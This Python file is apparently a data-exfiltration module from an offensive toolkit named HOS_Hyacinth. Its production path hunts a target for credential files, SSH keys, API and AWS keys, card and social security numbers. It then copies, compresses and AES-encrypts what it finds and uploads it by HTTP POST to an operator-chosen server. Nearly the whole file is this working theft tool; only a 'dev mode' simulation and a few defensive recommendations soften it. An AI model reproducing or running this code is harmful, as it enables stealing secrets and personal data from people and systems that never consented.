#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Data exfiltration module for HOS_Hyacinth"""

import argparse
import os
import sys
import json
import base64
import hashlib
import zipfile
import io
import shutil
import time
import tempfile
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple, BinaryIO
import re
import stat

from ..utils import logger, config


try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import padding
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    logger.warning("Cryptography library not available, encryption functionality will be limited")
    CRYPTOGRAPHY_AVAILABLE = False


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    logger.warning("Requests library not available, HTTP exfiltration will be limited")
    REQUESTS_AVAILABLE = False


class DataExfiltrator:
    """Class for handling data exfiltration operations."""
    
    # Patterns for sensitive data detection
    SENSITIVE_PATTERNS = {
        'credit_card': re.compile(r'\b(?:\d{4}[\s-]?){3}\d{4}\b'),
        'social_security': re.compile(r'\b\d{3}[\s-]?\d{2}[\s-]?\d{4}\b'),
        'password': re.compile(r'(?i)(?:password|passwd|pwd)[\s]*[=:]\s*[\'"](.+?)[\'"]'),
        'api_key': re.compile(r'(?i)(?:api[_-]?key|apikey)[\s]*[=:]\s*[\'"](.+?)[\'"]'),
        'private_key': re.compile(r'-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----'),
        'aws_key': re.compile(r'(?i)(aws_access_key_id|aws_secret_access_key)[\s]*[=:]\s*[\'"](.+?)[\'"]'),
        'database_url': re.compile(r'(?i)(jdbc|mongodb|mysql|postgresql)://[^\s]+'),
    }
    
    # File extensions likely to contain sensitive data
    SENSITIVE_FILE_EXTENSIONS = [
        '.txt', '.log', '.conf', '.config', '.ini', '.yaml', '.yml', 
        '.json', '.xml', '.csv', '.xls', '.xlsx', '.doc', '.docx', 
        '.pdf', '.key', '.pem', '.cer', '.pfx', '.pkcs12', '.sql'
    ]
    
    def __init__(self, target: str, exfil_type: str = 'all', 
                 encrypt: bool = False, compress: bool = True,
                 output_dir: Optional[str] = None, 
                 dev_mode: bool = False):
        """Initialize the data exfiltration module.
        
        Args:
            target: Target system or directory to extract data from
            exfil_type: Type of data to extract ('all', 'documents', 'credentials', 'system_info', etc.)
            encrypt: Whether to encrypt the extracted data
            compress: Whether to compress the extracted data
            output_dir: Directory to store extracted data locally
            dev_mode: Run in development mode with safe operations
        """
        self.target = target
        self.exfil_type = exfil_type
        self.encrypt = encrypt and CRYPTOGRAPHY_AVAILABLE
        self.compress = compress
        self.output_dir = output_dir or tempfile.gettempdir()
        self.dev_mode = dev_mode
        self.logger = logger
        self.config = config
        
        # Initialize internal tracking variables
        self.discovered_files = []
        self.extracted_data = []
        self.transferred_data = []
        self.exfiltration_statistics = {
            'total_files': 0,
            'processed_files': 0,
            'extracted_files': 0,
            'sensitive_files': 0,
            'data_volume': 0,
            'start_time': datetime.now(),
            'end_time': None
        }
        
        # Ensure output directory exists
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        
        # Generate encryption key if needed
        if self.encrypt:
            self.encryption_key = self._generate_encryption_key()
        else:
            self.encryption_key = None
    
    def _generate_encryption_key(self) -> bytes:
        """Generate a random encryption key."""
        if self.dev_mode:
            # In dev mode, use a predictable key for testing
            return hashlib.sha256(b'test_encryption_key').digest()
        else:
            # In production, generate a secure random key
            import secrets
            return secrets.token_bytes(32)  # 256-bit key
    
    def identify_sensitive_data(self) -> List[Dict[str, Any]]:
        """Identify potential sensitive data locations.
        
        Returns:
            List[Dict[str, Any]]: List of identified sensitive data locations
        """
        self.logger.info(f'Identifying sensitive data in target: {self.target}')
        
        # Clear previous discoveries
        self.discovered_files = []
        
        # In dev mode, simulate discovery
        if self.dev_mode:
            self.logger.info('In dev mode - simulating sensitive data discovery')
            # Simulate different types of sensitive files
            self.discovered_files = [
                {
                    'path': os.path.join(self.target, 'config.json'),
                    'size': 1024,
                    'type': 'configuration',
                    'sensitive_score': 0.9,
                    'discovered_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'dev_mode': True
                },
                {
                    'path': os.path.join(self.target, 'credentials.txt'),
                    'size': 512,
                    'type': 'credentials',
                    'sensitive_score': 0.95,
                    'discovered_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'dev_mode': True
                },
                {
                    'path': os.path.join(self.target, 'database_dump.sql'),
                    'size': 4096,
                    'type': 'database',
                    'sensitive_score': 0.85,
                    'discovered_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'dev_mode': True
                },
                {
                    'path': os.path.join(self.target, '.ssh/id_rsa'),
                    'size': 2048,
                    'type': 'private_key',
                    'sensitive_score': 1.0,
                    'discovered_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'dev_mode': True
                }
            ]
        else:
            # In production, perform actual discovery
            try:
                # Check if target is a directory
                if os.path.isdir(self.target):
                    self._scan_directory(self.target)
                # Check if target is a file
                elif os.path.isfile(self.target):
                    self._check_file_sensitivity(self.target)
                else:
                    self.logger.warning(f'Target {self.target} is neither a file nor a directory')
            except Exception as e:
                self.logger.error(f'Error identifying sensitive data: {str(e)}')
        
        # Update statistics
        self.exfiltration_statistics['total_files'] = len(self.discovered_files)
        self.exfiltration_statistics['sensitive_files'] = sum(1 for f in self.discovered_files 
                                                           if f.get('sensitive_score', 0) > 0.7)
        
        self.logger.info(f'Identified {len(self.discovered_files)} potential sensitive files')
        return self.discovered_files
    
    def _scan_directory(self, directory: str) -> None:
        """Scan a directory for sensitive files.
        
        Args:
            directory: Directory to scan
        """
        try:
            # Walk through the directory
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    self._check_file_sensitivity(file_path)
        except PermissionError:
            self.logger.warning(f'Permission denied when accessing {directory}')
        except Exception as e:
            self.logger.error(f'Error scanning directory {directory}: {str(e)}')
    
    def _check_file_sensitivity(self, file_path: str) -> None:
        """Check if a file contains sensitive data.
        
        Args:
            file_path: Path to the file to check
        """
        try:
            # Check file extension
            _, ext = os.path.splitext(file_path.lower())
            sensitive_score = 0.0
            file_type = 'unknown'
            
            # Score based on file extension
            if ext in self.SENSITIVE_FILE_EXTENSIONS:
                sensitive_score += 0.5
                file_type = self._determine_file_type(ext)
            
            # Check file name for sensitive keywords
            file_name = os.path.basename(file_path).lower()
            sensitive_keywords = ['password', 'credential', 'secret', 'key', 'token', 
                                  'auth', 'login', '.ssh', 'id_rsa', 'config']
            for keyword in sensitive_keywords:
                if keyword in file_name:
                    sensitive_score += 0.3
                    if file_type == 'unknown':
                        file_type = 'credentials'
                    break
            
            # Check file permissions (e.g., private keys should be restricted)
            try:
                st = os.stat(file_path)
                if ext == '.pem' or '.ssh' in file_path:
                    # Check if file has loose permissions
                    if os.name == 'nt':  # Windows
                        # Windows permission checking is more complex and omitted here
                        pass
                    else:  # Unix-like
                        if st.st_mode & (stat.S_IRWXG | stat.S_IRWXO):
                            sensitive_score += 0.1
                            self.logger.warning(f'{file_path} has overly permissive permissions')
            except Exception:
                pass
            
            # If the file seems sensitive, try to read and check content
            if sensitive_score > 0.5:
                try:
                    # Only check small files to avoid performance issues
                    if os.path.getsize(file_path) < 1024 * 1024:  # 1MB limit
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                        # Check for sensitive patterns
                        for pattern_name, pattern in self.SENSITIVE_PATTERNS.items():
                            if pattern.search(content):
                                sensitive_score = min(1.0, sensitive_score + 0.2)
                                if file_type == 'unknown':
                                    file_type = self._pattern_to_file_type(pattern_name)
                                break
                except Exception:
                    # Can't read the file, but still consider it potentially sensitive
                    pass
            
            # Add to discovered files if it has some sensitivity score
            if sensitive_score > 0:
                self.discovered_files.append({
                    'path': file_path,
                    'size': os.path.getsize(file_path),
                    'type': file_type,
                    'sensitive_score': sensitive_score,
                    'discovered_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })
        except Exception as e:
            self.logger.error(f'Error checking sensitivity of {file_path}: {str(e)}')
    
    def _determine_file_type(self, extension: str) -> str:
        """Determine file type based on extension.
        
        Args:
            extension: File extension
            
        Returns:
            str: File type
        """
        if extension in ['.json', '.yaml', '.yml', '.ini', '.conf', '.config']:
            return 'configuration'
        elif extension in ['.pem', '.key', '.cer', '.pfx', '.pkcs12']:
            return 'credentials'
        elif extension in ['.sql', '.csv', '.xls', '.xlsx']:
            return 'database'
        elif extension in ['.txt', '.log']:
            return 'text'
        elif extension in ['.doc', '.docx', '.pdf']:
            return 'document'
        else:
            return 'other'
    
    def _pattern_to_file_type(self, pattern_name: str) -> str:
        """Map pattern name to file type.
        
        Args:
            pattern_name: Name of the pattern
            
        Returns:
            str: File type
        """
        pattern_type_map = {
            'credit_card': 'financial',
            'social_security': 'personal',
            'password': 'credentials',
            'api_key': 'credentials',
            'private_key': 'credentials',
            'aws_key': 'credentials',
            'database_url': 'database'
        }
        return pattern_type_map.get(pattern_name, 'sensitive')
    
    def extract_data(self) -> List[Dict[str, Any]]:
        """Extract data from identified sensitive locations.
        
        Returns:
            List[Dict[str, Any]]: List of extracted data items
        """
        self.logger.info(f'Extracting data from {len(self.discovered_files)} identified locations')
        
        # Clear previous extractions
        self.extracted_data = []
        
        # Filter files based on exfil_type if specified
        files_to_extract = self.discovered_files
        if self.exfil_type != 'all':
            files_to_extract = [f for f in files_to_extract if f.get('type') == self.exfil_type]
        
        # In dev mode, simulate extraction
        if self.dev_mode:
            self.logger.info('In dev mode - simulating data extraction')
            # Simulate extraction of the discovered files
            for file_info in files_to_extract:
                extracted_item = {
                    'source_path': file_info['path'],
                    'size': file_info['size'],
                    'type': file_info['type'],
                    'extracted_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'local_path': os.path.join(self.output_dir, f"extracted_{os.path.basename(file_info['path'])}"),
                    'content_sample': 'Sample content for development mode',
                    'dev_mode': True
                }
                self.extracted_data.append(extracted_item)
        else:
            # In production, perform actual extraction
            for file_info in files_to_extract:
                try:
                    # Generate a unique name for the extracted file
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    base_name = os.path.basename(file_info['path'])
                    extracted_file_name = f"extracted_{timestamp}_{base_name}"
                    extracted_file_path = os.path.join(self.output_dir, extracted_file_name)
                    
                    # Copy the file to the output directory
                    shutil.copy2(file_info['path'], extracted_file_path)
                    
                    # Read a sample of the content for metadata (only for text files)
                    content_sample = None
                    if self._is_text_file(extracted_file_path):
                        try:
                            with open(extracted_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content_sample = f.read(500)  # First 500 chars
                        except Exception:
                            pass
                    
                    # Compress if needed
                    final_path = extracted_file_path
                    if self.compress:
                        final_path = self._compress_file(extracted_file_path)
                    
                    # Encrypt if needed
                    if self.encrypt:
                        final_path = self._encrypt_file(final_path)
                    
                    # Create extraction record
                    extracted_item = {
                        'source_path': file_info['path'],
                        'size': os.path.getsize(file_info['path']),
                        'extracted_size': os.path.getsize(final_path),
                        'type': file_info['type'],
                        'compressed': self.compress,
                        'encrypted': self.encrypt,
                        'extracted_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'local_path': final_path
                    }
                    
                    if content_sample:
                        extracted_item['content_sample'] = content_sample
                    
                    self.extracted_data.append(extracted_item)
                    
                    # Update statistics
                    self.exfiltration_statistics['processed_files'] += 1
                    self.exfiltration_statistics['extracted_files'] += 1
                    self.exfiltration_statistics['data_volume'] += os.path.getsize(final_path)
                    
                except Exception as e:
                    self.logger.error(f'Error extracting {file_info["path"]}: {str(e)}')
                    # Still count as processed, but not as extracted
                    self.exfiltration_statistics['processed_files'] += 1
        
        self.logger.info(f'Successfully extracted {len(self.extracted_data)} files')
        return self.extracted_data
    
    def _is_text_file(self, file_path: str) -> bool:
        """Check if a file is a text file.
        
        Args:
            file_path: Path to the file
            
        Returns:
            bool: True if the file appears to be text
        """
        # First check the file extension
        _, ext = os.path.splitext(file_path.lower())
        text_extensions = ['.txt', '.log', '.conf', '.config', '.ini', '.yaml', '.yml',
                          '.json', '.xml', '.csv', '.py', '.js', '.html', '.css']
        if ext in text_extensions:
            return True
        
        # If extension is not helpful, try to read a small portion and check for binary characters
        try:
            with open(file_path, 'rb') as f:
                chunk = f.read(1024)
                if b'\x00' in chunk:  # Null bytes indicate binary
                    return False
                # Check for high percentage of non-text characters
                text_chars = bytearray({7, 8, 9, 10, 12, 13, 27} | set(range(0x20, 0x100)))
                non_text = sum(1 for byte in chunk if byte not in text_chars)
                return non_text / len(chunk) < 0.3  # If < 30% non-text, consider it text
        except Exception:
            return False
    
    def _compress_file(self, file_path: str) -> str:
        """Compress a file using ZIP format.
        
        Args:
            file_path: Path to the file to compress
            
        Returns:
            str: Path to the compressed file
        """
        compressed_path = f"{file_path}.zip"
        
        try:
            with zipfile.ZipFile(compressed_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(file_path, os.path.basename(file_path))
            
            # Remove the original file
            os.remove(file_path)
            
            self.logger.debug(f'Compressed {file_path} to {compressed_path}')
            return compressed_path
        except Exception as e:
            self.logger.error(f'Error compressing {file_path}: {str(e)}')
            # Return the original path if compression fails
            return file_path
    
    def _encrypt_file(self, file_path: str) -> str:
        """Encrypt a file using AES-256-CBC.
        
        Args:
            file_path: Path to the file to encrypt
            
        Returns:
            str: Path to the encrypted file
        """
        if not CRYPTOGRAPHY_AVAILABLE:
            self.logger.warning('Cryptography library not available, skipping encryption')
            return file_path
        
        encrypted_path = f"{file_path}.enc"
        
        try:
            # Generate a random IV
            iv = os.urandom(16)
            
            # Create a cipher
            cipher = Cipher(algorithms.AES(self.encryption_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            
            # Read and encrypt the file
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            # Add padding
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(plaintext) + padder.finalize()
            
            # Encrypt the data
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Write IV and ciphertext to new file
            with open(encrypted_path, 'wb') as f:
                f.write(iv + ciphertext)
            
            # Remove the original file
            os.remove(file_path)
            
            self.logger.debug(f'Encrypted {file_path} to {encrypted_path}')
            return encrypted_path
        except Exception as e:
            self.logger.error(f'Error encrypting {file_path}: {str(e)}')
            # Return the original path if encryption fails
            return file_path
    
    def transfer_data(self, destination: Optional[str] = None, 
                     method: str = 'local') -> List[Dict[str, Any]]:
        """Transfer extracted data to a secure location.
        
        Args:
            destination: Destination location
            method: Transfer method ('local', 'http', 'ftp', etc.)
            
        Returns:
            List[Dict[str, Any]]: List of transfer records
        """
        self.logger.info(f'Transferring {len(self.extracted_data)} extracted items using {method} method')
        
        # Clear previous transfers
        self.transferred_data = []
        
        # In dev mode, simulate transfer
        if self.dev_mode:
            self.logger.info('In dev mode - simulating data transfer')
            for item in self.extracted_data:
                transfer_record = {
                    'source_path': item['local_path'],
                    'destination': destination or 'simulated_destination',
                    'method': method,
                    'size': item.get('extracted_size', item.get('size', 0)),
                    'transferred_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'success': True,
                    'dev_mode': True
                }
                self.transferred_data.append(transfer_record)
        else:
            # In production, perform actual transfer based on method
            if method == 'local':
                # Local transfer (just copy to destination directory)
                if destination:
                    # Ensure destination directory exists
                    if not os.path.exists(destination):
                        os.makedirs(destination)
                    
                    for item in self.extracted_data:
                        try:
                            dest_path = os.path.join(destination, os.path.basename(item['local_path']))
                            shutil.copy2(item['local_path'], dest_path)
                            
                            transfer_record = {
                                'source_path': item['local_path'],
                                'destination': dest_path,
                                'method': method,
                                'size': os.path.getsize(dest_path),
                                'transferred_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'success': True
                            }
                            self.transferred_data.append(transfer_record)
                            
                        except Exception as e:
                            self.logger.error(f'Error transferring {item["local_path"]}: {str(e)}')
                            transfer_record = {
                                'source_path': item['local_path'],
                                'destination': destination,
                                'method': method,
                                'error': str(e),
                                'transferred_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'success': False
                            }
                            self.transferred_data.append(transfer_record)
            elif method == 'http' and REQUESTS_AVAILABLE:
                # HTTP transfer (upload to a server)
                if destination:
                    for item in self.extracted_data:
                        try:
                            with open(item['local_path'], 'rb') as f:
                                files = {'file': (os.path.basename(item['local_path']), f)}
                                response = requests.post(destination, files=files)
                                response.raise_for_status()
                                
                                transfer_record = {
                                    'source_path': item['local_path'],
                                    'destination': destination,
                                    'method': method,
                                    'size': os.path.getsize(item['local_path']),
                                    'response_code': response.status_code,
                                    'transferred_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                    'success': True
                                }
                                self.transferred_data.append(transfer_record)
                                
                        except Exception as e:
                            self.logger.error(f'Error transferring {item["local_path"]} via HTTP: {str(e)}')
                            transfer_record = {
                                'source_path': item['local_path'],
                                'destination': destination,
                                'method': method,
                                'error': str(e),
                                'transferred_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'success': False
                            }
                            self.transferred_data.append(transfer_record)
            else:
                self.logger.error(f'Transfer method {method} not supported or missing dependencies')
                # Fall back to local transfer
                self.logger.info('Falling back to local transfer')
                return self.transfer_data(destination, 'local')
        
        successful_transfers = sum(1 for transfer in self.transferred_data if transfer['success'])
        self.logger.info(f'Successfully transferred {successful_transfers} of {len(self.transferred_data)} items')
        return self.transferred_data
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate a comprehensive exfiltration report.
        
        Returns:
            Dict[str, Any]: Full exfiltration report
        """
        # Update end time if not already set
        if self.exfiltration_statistics['end_time'] is None:
            self.exfiltration_statistics['end_time'] = datetime.now()
        
        # Calculate duration
        duration = (self.exfiltration_statistics['end_time'] - 
                   self.exfiltration_statistics['start_time']).total_seconds()
        
        report = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'target': self.target,
            'exfil_type': self.exfil_type,
            'encrypt': self.encrypt,
            'compress': self.compress,
            'dev_mode': self.dev_mode,
            'statistics': {
                'total_files': self.exfiltration_statistics['total_files'],
                'processed_files': self.exfiltration_statistics['processed_files'],
                'extracted_files': self.exfiltration_statistics['extracted_files'],
                'sensitive_files': self.exfiltration_statistics['sensitive_files'],
                'data_volume_bytes': self.exfiltration_statistics['data_volume'],
                'data_volume_human': self._human_readable_size(self.exfiltration_statistics['data_volume']),
                'duration_seconds': duration,
                'start_time': self.exfiltration_statistics['start_time'].strftime('%Y-%m-%d %H:%M:%S'),
                'end_time': self.exfiltration_statistics['end_time'].strftime('%Y-%m-%d %H:%M:%S')
            },
            'discovered_files': self.discovered_files,
            'extracted_data': self.extracted_data,
            'transferred_data': self.transferred_data,
            'recommendations': self._generate_recommendations()
        }
        
        return report
    
    def _human_readable_size(self, size_bytes: int) -> str:
        """Convert size in bytes to human-readable format.
        
        Args:
            size_bytes: Size in bytes
            
        Returns:
            str: Human-readable size
        """
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} PB"
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings.
        
        Returns:
            List[str]: Security recommendations
        """
        recommendations = []
        
        # General recommendations
        recommendations.append('Implement data loss prevention (DLP) solutions')
        recommendations.append('Encrypt sensitive data at rest and in transit')
        recommendations.append('Implement strict access controls and least privilege principle')
        recommendations.append('Regularly audit and remove unnecessary sensitive data')
        
        # Check if any sensitive files were found
        if self.exfiltration_statistics['sensitive_files'] > 0:
            recommendations.append(f'Review and secure the {self.exfiltration_statistics['sensitive_files']} sensitive files detected')
        
        # Add specific recommendations based on file types
        file_types = set(item.get('type') for item in self.discovered_files if 'type' in item)
        if 'credentials' in file_types:
            recommendations.append('Move credentials to a secure credential management system')
        if 'private_key' in file_types:
            recommendations.append('Review SSH key management practices and ensure proper key rotation')
        if 'database' in file_types:
            recommendations.append('Review database backup and dump security procedures')
        
        return recommendations
    
    def save_report(self, report_path: Optional[str] = None) -> str:
        """Save the exfiltration report to a file.
        
        Args:
            report_path: Path to save the report. If None, a default path will be used.
            
        Returns:
            str: Path to the saved report file
        """
        if report_path is None:
            # Create a default report path
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report_path = os.path.join(self.output_dir, f'exfiltration_report_{timestamp}.json')
        
        report = self.generate_report()
        
        try:
            with open(report_path, 'w') as f:
                json.dump(report, f, indent=2)
            self.logger.info(f'Report saved to {report_path}')
            return report_path
        except Exception as e:
            self.logger.error(f'Error saving report: {str(e)}')
            raise
    
    def execute(self, destination: Optional[str] = None, 
                transfer_method: str = 'local',
                save_report: bool = False, 
                report_path: Optional[str] = None) -> Dict[str, Any]:
        """Execute the complete data exfiltration workflow.
        
        Args:
            destination: Destination for transferred data
            transfer_method: Method to use for data transfer
            save_report: Whether to save the report to a file
            report_path: Path to save the report
            
        Returns:
            Dict[str, Any]: Final exfiltration results
        """
        try:
            # 1. Identify sensitive data locations
            self.identify_sensitive_data()
            
            # 2. Extract data based on type
            self.extract_data()
            
            # 3. Transfer data to secure location
            if self.extracted_data:
                self.transfer_data(destination, transfer_method)
            
            # 4. Update end time
            self.exfiltration_statistics['end_time'] = datetime.now()
            
            # 5. Generate and optionally save report
            final_report = self.generate_report()
            if save_report:
                final_report_path = self.save_report(report_path)
                final_report['report_file'] = final_report_path
            
            # 6. Return the final results
            return {
                'success': len(self.extracted_data) > 0,
                'message': 'Data exfiltration process completed',
                'extracted_count': len(self.extracted_data),
                'transferred_count': len(self.transferred_data),
                'details': final_report
            }
        except Exception as e:
            self.logger.error(f'Error during data exfiltration: {str(e)}')
            # Update end time even on error
            self.exfiltration_statistics['end_time'] = datetime.now()
            return {
                'success': False,
                'message': f'Error during data exfiltration: {str(e)}',
                'details': {}
            }
    
    def cleanup(self) -> None:
        """Clean up temporary files and resources."""
        self.logger.info('Cleaning up temporary resources')
        
        # Clean up extracted files if in dev mode
        if self.dev_mode:
            for item in self.extracted_data:
                if 'local_path' in item and os.path.exists(item['local_path']):
                    try:
                        os.remove(item['local_path'])
                        self.logger.debug(f'Cleaned up dev mode file: {item['local_path']}')
                    except Exception as e:
                        self.logger.error(f'Error cleaning up {item['local_path']}: {str(e)}')
        
        # Clear internal variables
        self.discovered_files = []
        self.extracted_data = []
        self.transferred_data = []


def run(args: argparse.Namespace) -> None:
    """Extract sensitive data from target"""
    logger.info(f"Starting data exfiltration on target: {args.target}")
    logger.debug(f"Exfiltration parameters: {vars(args)}")
    
    # Check if in development mode
    is_dev_mode = config.get_mode()
    
    if is_dev_mode:
        logger.info("Running in DEVELOPMENT mode - detailed analysis enabled")
    else:
        logger.info("Running in PRODUCTION mode - optimized for performance")
    
    # Prepare extraction parameters
    exfil_type = getattr(args, 'type', 'all')
    encrypt = getattr(args, 'encrypt', False)
    compress = getattr(args, 'compress', True)
    destination = getattr(args, 'destination', None)
    transfer_method = getattr(args, 'method', 'local')
    
    # Create and execute the data exfiltration module
    exfiltrator = DataExfiltrator(
        target=args.target,
        exfil_type=exfil_type,
        encrypt=encrypt,
        compress=compress,
        output_dir=getattr(args, 'output_dir', None),
        dev_mode=is_dev_mode
    )
    
    result = exfiltrator.execute(
        destination=destination,
        transfer_method=transfer_method,
        save_report=args.output is not None,
        report_path=args.output
    )
    
    # Log summary of results
    if result['success']:
        logger.info(f'Successfully extracted {result['extracted_count']} files from {args.target}')
        logger.info(f'Transferred {result['transferred_count']} files using {transfer_method} method')
    else:
        logger.info(f'Data exfiltration completed with errors for target: {args.target}')
    
    logger.info(f"Data exfiltration completed for target: {args.target}")
    
    if args.output:
        logger.info(f"Results saved to: {args.output}")
    
    # Clean up resources
    exfiltrator.cleanup()
